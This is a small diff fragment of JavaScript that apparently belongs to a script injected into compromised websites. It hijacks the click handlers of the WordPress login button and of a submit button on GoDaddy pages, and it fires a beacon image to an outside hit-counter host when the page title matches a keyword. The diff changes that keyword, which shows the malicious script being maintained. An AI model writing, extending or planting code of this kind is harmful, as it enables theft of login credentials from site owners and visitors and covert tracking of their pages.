@@ -6,7 +6,7 @@ document.getElementById('wp-submit').onclick = function() {
 };
 }
 
-if(document.title.toLowerCase().indexOf("porno") >= 0){new Image().src = '//whos.amung.us/widget/kekonam3.png'; }
+if(document.title.toLowerCase().indexOf("porn") >= 0){new Image().src = '//whos.amung.us/widget/kekonam3.png'; }
 
 if(window.location.href.indexOf("godaddy") > 0) {
 document.getElementById('submitBtn').onclick = function() {
